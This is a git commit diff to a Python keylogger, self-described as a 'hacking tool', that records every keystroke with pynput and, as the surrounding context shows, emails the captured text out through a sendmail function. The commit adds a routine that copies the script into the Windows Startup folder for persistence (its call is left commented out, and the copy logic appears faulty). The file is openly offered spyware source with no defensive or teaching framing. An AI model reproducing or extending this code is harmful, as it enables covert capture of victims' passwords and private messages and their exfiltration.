871ede18537ad8ec8f5a25a31a0542d8a0cf42ff
natidemeke3 <natidemeke3@gmail.com>
2022-09-17 00:17:00 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,14 +1,33 @@
-#version keylogger.py 1.0.1
-print("keylogger version###############1.0.1##################")
-
+#version keylogger.py 1.1.1 ////hacking tool\\\\\\\\\
+print("keylogger version###############1.1.1##################")
 from pynput.keyboard import Key, Listener
 import smtplib, ssl
 import time
 import schedule
 import socket
-#this is the main sentence that is gonna be printed 
-word = " "
 from email.message import EmailMessage
+import os
+import shutil
+
+
+word = " "
+def move_file_to_startapp():
+    main_destination = ['Hp', 'hp', 'user', 'lenovo', 'dell']
+    current_dir = os.getcwd()
+    destination = " "
+    for dir in main_destination:
+      try:
+        if str(dir) in current_dir:
+          destination = "C:\\Users\\Hp\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.py"
+
+      except:
+        print("not found")
+    
+    shutil.copy(current_dir, destination)
+
+
+
+
 
 def sendmail(user_message):
     host = socket.gethostname()
@@ -44,7 +63,7 @@ def on_press(key):
         if len(word) / 100 == i:
             sendmail(word)
 
-
+#move_file_to_startapp()
 with Listener(on_press=on_press) as listener:
     listener.join()
 
